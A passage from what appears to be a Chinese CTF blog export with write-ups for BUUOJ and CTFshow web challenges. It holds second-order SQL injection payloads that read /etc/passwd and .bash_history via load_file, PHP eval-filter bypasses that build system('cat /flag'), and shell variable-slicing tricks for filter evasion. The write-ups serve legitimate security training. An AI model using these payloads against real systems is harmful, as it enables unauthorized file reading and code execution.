addslashes($_POST[<span class=\"string\">'title'</span>]);</span><br><span class=\"line\">    $content = addslashes($_POST[<span class=\"string\">'content'</span>]);</span><br><span class=\"line\">    $sql = <span class=\"string\">\"insert into board</span></span><br><span class=\"line\"><span class=\"string\">            set category = '$category',</span></span><br><span class=\"line\"><span class=\"string\">                title = '$title',</span></span><br><span class=\"line\"><span class=\"string\">                content = '$content'\"</span>;</span><br><span class=\"line\">    $result = mysql_query($sql);</span><br><span class=\"line\">    header(<span class=\"string\">\"Location: ./index.php\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\"><span class=\"keyword\">case</span> <span class=\"string\">'comment'</span>:</span><br><span class=\"line\">    $bo_id = addslashes($_POST[<span class=\"string\">'bo_id'</span>]);</span><br><span class=\"line\">    $sql = <span class=\"string\">\"select category from board where id='$bo_id'\"</span>;</span><br><span class=\"line\">    $result = mysql_query($sql);</span><br><span class=\"line\">    $num = mysql_num_rows($result);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>($num&gt;<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">    $category = mysql_fetch_array($result)[<span class=\"string\">'category'</span>];</span><br><span class=\"line\">    $content = addslashes($_POST[<span class=\"string\">'content'</span>]);</span><br><span class=\"line\">    $sql = <span class=\"string\">\"insert into comment</span></span><br><span class=\"line\"><span class=\"string\">            set category = '$category',</span></span><br><span class=\"line\"><span class=\"string\">                content = '$content',</span></span><br><span class=\"line\"><span class=\"string\">                bo_id = '$bo_id'\"</span>;</span><br><span class=\"line\">    $result = mysql_query($sql);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    header(<span class=\"string\">\"Location: ./comment.php?id=$bo_id\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\"><span class=\"keyword\">default</span>:</span><br><span class=\"line\">    header(<span class=\"string\">\"Location: ./index.php\"</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    header(<span class=\"string\">\"Location: ./index.php\"</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>可以看到addslashes给每个参数都进行了处理<br><img src=\"https://img-blog.csdnimg.cn/20200606132603676.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>但数据库存入的数据是会自动做过滤处理的，也就是说数据还是会原样插入到数据库中<img src=\"https://img-blog.csdnimg.cn/20200606133731798.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>而这部分<br><img src=\"https://img-blog.csdnimg.cn/20200606133838938.png\" alt=\"在这里插入图片描述\"><br>mysql_fetch_array直接调用category，造成二次注入。</p>\n<h4 id=\"构造\"><a href=\"#构造\" class=\"headerlink\" title=\"构造\"></a>构造</h4><p><img src=\"https://img-blog.csdnimg.cn/20200606134340401.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>进入留言板在content构造*/#提交<br>此时数据库语句是</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">$sql = <span class=\"string\">\"insert into comment</span></span><br><span class=\"line\"><span class=\"string\">            set category = 'aaa',content=database(),/*',</span></span><br><span class=\"line\"><span class=\"string\">                content = '*/#',</span></span><br><span class=\"line\"><span class=\"string\">                bo_id = '$bo_id'\"</span>;</span><br></pre></td></tr></table></figure>\n<p>后面的<code>*/#</code>和前一个末尾<code>/*</code>拼接把后面的都注释掉<br>就成了</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">$sql = <span class=\"string\">\"insert into comment</span></span><br><span class=\"line\"><span class=\"string\">            set category = 'aaa',</span></span><br><span class=\"line\"><span class=\"string\">            content=database(),</span></span><br></pre></td></tr></table></figure>\n<p>成功读取数据库<br><img src=\"https://img-blog.csdnimg.cn/20200606134724177.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<h4 id=\"解题\"><a href=\"#解题\" class=\"headerlink\" title=\"解题\"></a>解题</h4><p>load_file读文件位置</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">aaa<span class=\"string\">',content=(select( load_file('</span>/etc/passwd<span class=\"string\">'))),/*</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://img-blog.csdnimg.cn/20200606135704949.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>查看使用过的系统命令</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">aaa<span class=\"string\">',content=(select(load_file(\"/home/www/.bash_history\"))),/*</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://img-blog.csdnimg.cn/20200606135852883.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>十六进制读.DS.Store</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">aaa<span class=\"string\">',content=(select hex(load_file(\"/tmp/html/.DS_Store\"))),/*</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://img-blog.csdnimg.cn/20200606140209997.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/20200606140304937.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>读flag_8946e1ff1ee3e40f.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">aaa<span class=\"string\">',content=(select hex(load_file('</span>/<span class=\"keyword\">var</span>/www/html/flag_8946e1ff1ee3e40f.php<span class=\"string\">'))),/*</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://img-blog.csdnimg.cn/20200606140416124.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>ps:tmp/html文件下读出来的flag是假的<br>解码即得flag<br><img src=\"https://img-blog.csdnimg.cn/20200606141148586.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n","categories":["buu刷题"],"tags":["sql","代码审计"]},{"title":"CISCN2019初赛——Love_Math","url":"/2020/06/03/buu11%E2%80%94%E2%80%94%5BCISCN%202019%20%E5%88%9D%E8%B5%9B%5DLove%20Math/","content":"<p>平台：buuoj.cn<br>打开靶机源码如下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"comment\">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'c'</span>]))&#123;</span><br><span class=\"line\">    show_source(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//例子 c=20-1</span></span><br><span class=\"line\">    $content = $_GET[<span class=\"string\">'c'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (strlen($content) &gt;= <span class=\"number\">80</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">\"太长了不会算\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $blacklist = [<span class=\"string\">' '</span>, <span class=\"string\">'\\t'</span>, <span class=\"string\">'\\r'</span>, <span class=\"string\">'\\n'</span>,<span class=\"string\">'\\''</span>, <span class=\"string\">'\"'</span>, <span class=\"string\">'`'</span>, <span class=\"string\">'\\['</span>, <span class=\"string\">'\\]'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">foreach</span> ($blacklist <span class=\"keyword\">as</span> $blackitem) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (preg_match(<span class=\"string\">'/'</span> . $blackitem . <span class=\"string\">'/m'</span>, $content)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">\"请不要输入奇奇怪怪的字符\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class=\"line\">    $whitelist = [<span class=\"string\">'abs'</span>, <span class=\"string\">'acos'</span>, <span class=\"string\">'acosh'</span>, <span class=\"string\">'asin'</span>, <span class=\"string\">'asinh'</span>, <span class=\"string\">'atan2'</span>, <span class=\"string\">'atan'</span>, <span class=\"string\">'atanh'</span>, <span class=\"string\">'base_convert'</span>, <span class=\"string\">'bindec'</span>, <span class=\"string\">'ceil'</span>, <span class=\"string\">'cos'</span>, <span class=\"string\">'cosh'</span>, <span class=\"string\">'decbin'</span>, <span class=\"string\">'dechex'</span>, <span class=\"string\">'decoct'</span>, <span class=\"string\">'deg2rad'</span>, <span class=\"string\">'exp'</span>, <span class=\"string\">'expm1'</span>, <span class=\"string\">'floor'</span>, <span class=\"string\">'fmod'</span>, <span class=\"string\">'getrandmax'</span>, <span class=\"string\">'hexdec'</span>, <span class=\"string\">'hypot'</span>, <span class=\"string\">'is_finite'</span>, <span class=\"string\">'is_infinite'</span>, <span class=\"string\">'is_nan'</span>, <span class=\"string\">'lcg_value'</span>, <span class=\"string\">'log10'</span>, <span class=\"string\">'log1p'</span>, <span class=\"string\">'log'</span>, <span class=\"string\">'max'</span>, <span class=\"string\">'min'</span>, <span class=\"string\">'mt_getrandmax'</span>, <span class=\"string\">'mt_rand'</span>, <span class=\"string\">'mt_srand'</span>, <span class=\"string\">'octdec'</span>, <span class=\"string\">'pi'</span>, <span class=\"string\">'pow'</span>, <span class=\"string\">'rad2deg'</span>, <span class=\"string\">'rand'</span>, <span class=\"string\">'round'</span>, <span class=\"string\">'sin'</span>, <span class=\"string\">'sinh'</span>, <span class=\"string\">'sqrt'</span>, <span class=\"string\">'srand'</span>, <span class=\"string\">'tan'</span>, <span class=\"string\">'tanh'</span>];</span><br><span class=\"line\">    preg_match_all(<span class=\"string\">'/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/'</span>, $content, $used_funcs);  </span><br><span class=\"line\">    <span class=\"keyword\">foreach</span> ($used_funcs[<span class=\"number\">0</span>] <span class=\"keyword\">as</span> $func) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">\"请不要输入奇奇怪怪的函数\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//帮你算出答案</span></span><br><span class=\"line\">    <span class=\"keyword\">eval</span>(<span class=\"string\">'echo '</span>.$content.<span class=\"string\">';'</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>$content限制了长度<br>$blacklist过滤了一些字符<br>$whitelist过滤了一些单词</p>\n<h4 id=\"前置知识\"><a href=\"#前置知识\" class=\"headerlink\" title=\"前置知识\"></a>前置知识</h4><blockquote>\n<p>base_convert() 函数：在任意进制之间转换数字。<br>dechex() 函数：把十进制转换为十六进制。<br>hex2bin() 函数：把十六进制值的字符串转换为 ASCII 字符。</p>\n</blockquote>\n<h4 id=\"解题\"><a href=\"#解题\" class=\"headerlink\" title=\"解题\"></a>解题</h4><p>一、</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">payload:</span><br><span class=\"line\">?c=$pi=base_convert(<span class=\"number\">37907361743</span>,<span class=\"number\">10</span>,<span class=\"number\">36</span>)(dechex(<span class=\"number\">1598506324</span>));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi=system&amp;abs=ls%<span class=\"number\">20</span>/</span><br></pre></td></tr></table></figure>\n<p>分段看</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">base_convert(<span class=\"number\">37907361743</span>,<span class=\"number\">10</span>,<span class=\"number\">36</span>) = hex2bin</span><br><span class=\"line\">dechex(<span class=\"number\">1598506324</span>) = <span class=\"number\">5</span>f474554</span><br><span class=\"line\">hex2bin(<span class=\"string\">'5f474554'</span>) = _GET</span><br><span class=\"line\">($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;) = $_GET&#123;pi&#125;($_GET&#123;abs&#125;)</span><br><span class=\"line\">($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi=system&amp;abs=cat%<span class=\"number\">20</span>/flag =&gt; $_GET&#123;system&#125;($_GET&#123;cat%<span class=\"number\">20</span>/flag&#125;)=&gt;system(<span class=\"string\">'cat%20/flag'</span>)</span><br></pre></td></tr></table></figure>\n<p>二、</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">?c=$pi=(is_nan^(<span class=\"number\">6</span>).(<span class=\"number\">4</span>)).(tan^(<span class=\"number\">1</span>).(<span class=\"number\">5</span>));$pi=$$pi;$pi&#123;pi&#125;($pi&#123;abs&#125;)&amp;<span class=\"number\">0</span>=system&amp;<span class=\"number\">1</span>=cat%<span class=\"number\">20</span>/flag</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">(is_nan^(<span class=\"number\">6</span>).(<span class=\"number\">4</span>)).(tan^(<span class=\"number\">1</span>).(<span class=\"number\">5</span>)) = _GET</span><br><span class=\"line\">($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;) = $_GET&#123;pi&#125;($_GET&#123;abs&#125;)</span><br><span class=\"line\">($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi=system&amp;abs=cat%<span class=\"number\">20</span>/flag =&gt; $_GET&#123;system&#125;($_GET&#123;cat%<span class=\"number\">20</span>/flag&#125;)=&gt;system(<span class=\"string\">'cat%20/flag'</span>)</span><br></pre></td></tr></table></figure>\n<p>关于PHP Math 函数<br>可用</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$payload = [<span class=\"string\">'abs'</span>, <span class=\"string\">'acos'</span>, <span class=\"string\">'acosh'</span>, <span class=\"string\">'asin'</span>, <span class=\"string\">'asinh'</span>, <span class=\"string\">'atan2'</span>, <span class=\"string\">'atan'</span>, <span class=\"string\">'atanh'</span>,  <span class=\"string\">'bindec'</span>, <span class=\"string\">'ceil'</span>, <span class=\"string\">'cos'</span>, <span class=\"string\">'cosh'</span>, <span class=\"string\">'decbin'</span> , <span class=\"string\">'decoct'</span>, <span class=\"string\">'deg2rad'</span>, <span class=\"string\">'exp'</span>, <span class=\"string\">'expm1'</span>, <span class=\"string\">'floor'</span>, <span class=\"string\">'fmod'</span>, <span class=\"string\">'getrandmax'</span>, <span class=\"string\">'hexdec'</span>, <span class=\"string\">'hypot'</span>, <span class=\"string\">'is_finite'</span>, <span class=\"string\">'is_infinite'</span>, <span class=\"string\">'is_nan'</span>, <span class=\"string\">'lcg_value'</span>, <span class=\"string\">'log10'</span>, <span class=\"string\">'log1p'</span>, <span class=\"string\">'log'</span>, <span class=\"string\">'max'</span>, <span class=\"string\">'min'</span>, <span class=\"string\">'mt_getrandmax'</span>, <span class=\"string\">'mt_rand'</span>, <span class=\"string\">'mt_srand'</span>, <span class=\"string\">'octdec'</span>, <span class=\"string\">'pi'</span>, <span class=\"string\">'pow'</span>, <span class=\"string\">'rad2deg'</span>, <span class=\"string\">'rand'</span>, <span class=\"string\">'round'</span>, <span class=\"string\">'sin'</span>, <span class=\"string\">'sinh'</span>, <span class=\"string\">'sqrt'</span>, <span class=\"string\">'srand'</span>, <span class=\"string\">'tan'</span>, <span class=\"string\">'tanh'</span>];</span><br><span class=\"line\"><span class=\"keyword\">for</span>($k=<span class=\"number\">1</span>;$k&lt;=sizeof($payload);$k++)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>($i = <span class=\"number\">0</span>;$i &lt; <span class=\"number\">9</span>; $i++)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>($j = <span class=\"number\">0</span>;$j &lt;=<span class=\"number\">9</span>;$j++)&#123;</span><br><span class=\"line\">            $exp = $payload[$k] ^ $i.$j;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span>($payload[$k].<span class=\"string\">\"^$i$j\"</span>.<span class=\"string\">\"==&gt;$exp\"</span>);</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">\"       \"</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>可对应查询相关字符<br>三、</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">$pi=base_convert,$pi(<span class=\"number\">696468</span>,<span class=\"number\">10</span>,<span class=\"number\">36</span>)($pi(<span class=\"number\">8768397090111664438</span>,<span class=\"number\">10</span>,<span class=\"number\">30</span>)()&#123;<span class=\"number\">1</span>&#125;)</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">$pi(<span class=\"number\">696468</span>,<span class=\"number\">10</span>,<span class=\"number\">36</span>) = exec</span><br><span class=\"line\">$pi(<span class=\"number\">8768397090111664438</span>,<span class=\"number\">10</span>,<span class=\"number\">30</span>) = getallheaders</span><br><span class=\"line\">$pi=base_convert,$pi(<span class=\"number\">696468</span>,<span class=\"number\">10</span>,<span class=\"number\">36</span>)($pi(<span class=\"number\">8768397090111664438</span>,<span class=\"number\">10</span>,<span class=\"number\">30</span>)()&#123;<span class=\"number\">1</span>&#125;) = exec(getallheaders()&#123;<span class=\"number\">1</span>&#125;)</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>getallheaders — 获取全部 HTTP 请求头信息</p>\n</blockquote>\n<p><img src=\"https://img-blog.csdnimg.cn/20200603174759653.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>抓包重放<br>在请求头加上cat /flag<br><img src=\"https://img-blog.csdnimg.cn/20200603181824494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n","categories":["buu刷题"],"tags":["代码审计"]},{"title":"CTFSHOWweb月饼杯web3引发的问题","url":"/2020/10/02/CTFshow_webfirst_wp/","content":"<p>起因是平台上羽师傅出的一道环境变量截取和linux通配符的题，原题是平台月饼杯的web3_莫负婵娟。</p>\n<p>简单介绍一下环境变量截取构造。</p>\n<p>我们都知道linux中有个环境变量<code>$PATH</code>，它决定了shell将到哪些目录中寻找命令或程序，一般是这样</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201002163306.png\" alt=\"\"></p>\n<p>而linux中，我们是可以通过<code>$</code>和<code>{}</code>来提取环境变量中某个或者某些字符串的，比如</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201002163837.png\" alt=\"\"></p>\n<p>因此，按照这种构造方式，我们就可以构造出诸如ls，cat之类的命令，从而达到命令执行的目的</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201002164158.png\" alt=\"\"></p>\n<p>当然还有更多的截取方式</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$&#123;file#*&#x2F;&#125;：删掉第一个 &#x2F; 及其左边的字符串：dir1&#x2F;dir2&#x2F;dir3&#x2F;my.file.txt</span><br><span class=\"line\">$&#123;file##*&#x2F;&#125;：删掉最后一个 &#x2F;  及其左边的字符串：my.file.txt</span><br><span class=\"line\">$&#123;file#*.&#125;：删掉第一个 .  及其左边的字符串：file.txt</span><br><span class=\"line\">$&#123;file##*.&#125;：删掉最后一个 .  及其左边的字符串：txt</span><br><span class=\"line\">$&#123;file%&#x2F;*&#125;：删掉最后一个  &#x2F;  及其右边的字符串：&#x2F;dir1&#x2F;dir2&#x2F;dir3</span><br><span class=\"line\">$&#123;file%%&#x2F;*&#125;：删掉第一个 &#x2F;  及其右边的字符串：(空值)</span><br><span class=\"line\">$&#123;file%.*&#125;：删掉最后一个  .  及其右边的字符串：&#x2F;dir1&#x2F;dir2&#x2F;dir3&#x2F;my.file</span><br><span class=\"line\">$&#123;file%%.*&#125;：删掉第一个  .   及其右边的字符串：&#x2F;dir1&#x2F;dir2&#x2F;dir3&#x2F;my</span><br></pre></td></tr></table></figure>\n\n<p>具体请看<a href=\"https://www.shuzhiduo.com/A/B0zqQamGzv/\" target=\"_blank\" rel=\"noopener\">参考</a>，这里只讨论其中一两种方式</p>\n<p>按照上述方法，可以构造得到payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?ip&#x3D;0;$&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125;  &#x2F;&#x2F;0;ls</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">ip&#x3D;0;$&#123;PATH:14:1&#125;$&#123;PATH:5:1&#125; ????.??? &#x2F;&#x2F;0;nl ????.??? (通配符匹配)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201002164338.png\" alt=\"\"></p>\n<p>但这种截取环境变量的方式在做羽师傅续出的web入门题月饼杯web3’s revenge出了问题。</p>\n<p>首先打开题目直接是到了月饼杯web3的第二关，并且查看源码提示了信息是命令执行</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201002165244.png\" alt=\"\"></p>\n<p>那么有了上道题的经验，有没有可能再次构造出相应的payload呢，不妨试一下</p>\n<p>首先fuzz一下题目过滤了哪些字符</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201002165451.png\" alt=\"\"></p>\n<p>发现，除了几个<code>?</code>,<code>{}</code>,<code>~</code>,<code>#</code>符号之外，只允许输入大写字母，显然之前用数字截取的方式不再适用</p>\n<p>那么注意点放到了这几个仅存的字符上，首先是<code>~</code>，在实际测试中发现当使用取反对变量进行截取，可以输出变量中的最后一位，比如</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201002170118.png\" alt=\"\"></p>\n<p>而有些环境变量比如<code>$SHELL</code>，<code>$SHLVL</code>在大多数环境中是通用的，因此我们就多了几个可以利用的字母</p>\n<p>再看到<code>#</code>号，上面的参考文章中已经知道，<code>#</code>可以用来截取变量，比如说<code>echo ${var#*//}</code>是删除左边字符，保留右边字符。而当我再把<code>#</code>号放到变量左边时，有了意外的结果</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201002171138.png\" alt=\"\"></p>\n<p>得到了数字！而且9正是<code>$PATH</code>中我想要的数字中字母<code>l</code>的位置，那么如果我们把这个截取字符串作为截取过程中<code>:</code>的参数，这个截取有没有效呢，答案是肯定的</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201002171950.png\" alt=\"\"></p>\n<p>nice了，那么现在就可以构造了，看着几个固定的环境变量，构造出了下面的payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$&#123;PATH:~A&#125;$&#123;PATH:$&#123;#SHELL&#125;:$&#123;SHLVL:~A&#125;&#125;  &#x2F;&#x2F;nl</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$&#123;PATH:$&#123;#SHELL&#125;:$&#123;SHLVL:~A&#125;&#125;$&#123;PATH:$&#123;#_&#125;:$&#123;SHLVL:~A&#125;&#125; &#x2F;&#x2F;ls</span><br></pre></td></tr></table></figure>\n\n<p>ps：值得提醒的是，有些环境变量在具体的环境中数值是不一样的，所以有可能失效，所有要视自己的环境而定，我这测试了两台虚拟机</p>\n<p>在命令行试了下可以看到是有效的</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201002172932.png\" alt=\"\"></p>\n<p>那么问题就来了，把payload传进入打不通（难受。。。。）</p>\n<p>后来问了出题人也说payload没问题，docker可以打通，可能就是php的问题，后来在php中试了下，确实有问题</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201002204235.png\" alt=\"\"></p>\n<p>搜了下这个报错，大概是与linux shell使用的是/bin/sh，还是/bin/bash有关系。。。。</p>\n<p>那也没办法处理只好到这里了，虽然没做出来，好在也算学到了个新姿势</p>\n","categories":["CTF"],"tags":["linux变量截取"]},{"title":"MRCTF2020——套娃","url":"/2020/06/12/buu16%E2%80%94%E2%80%94%5BMRCTF2020%5D%E5%A5%97%E5%A8%83/","content":"<p>平台：buuoj.cn<br>打开靶机源码处php代码<br><img src=\"https://img-blog.csdnimg.cn/20200612100526920.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>第一个if如果传入的参数出现<code>_</code>和它的url编码<code>%5f</code>，则打印Y0u are So cutE!<br>绕过：用<code>.</code>或空格代替<code>_</code><br>第二个if要b_u_r_t的值为23333但添加了正则匹配，用<code>^</code>和<code>$</code>来界定23333的首尾，代表了“行的开头和结尾”，只匹配一行，因此%0a换行绕过<br><img src=\"https://img-blog.csdnimg.cn/20200612103053595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>打开secrettw.php<br><img src=\"https://img-blog.csdnimg.cn/20200612103336714.png\" alt=\"在这里插入图片描述\"><br>提示本地，xff不行，用client-ip<br><img src=\"https://img-blog.csdnimg.cn/20200612103449400.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>下面的jsfuck代码直接控制台输出<br><img src=\"https://img-blog.csdnimg.cn/20200612103720862.png\" alt=\"在这里插入图片描述\"><br>那么就post一个Merak随便传个值<br>回显php，代码如下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>); </span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">'takeip.php'</span>;</span><br><span class=\"line\">ini_set(<span class=\"string\">'open_basedir'</span>,<span class=\"string\">'.'</span>); </span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">'flag.php'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">'Merak'</span>]))&#123; </span><br><span class=\"line\">    highlight_file(<span class=\"keyword\">__FILE__</span>); </span><br><span class=\"line\">    <span class=\"keyword\">die</span>(); </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">change</span><span class=\"params\">($v)</span></span>&#123; </span><br><span class=\"line\">    $v = base64_decode($v); 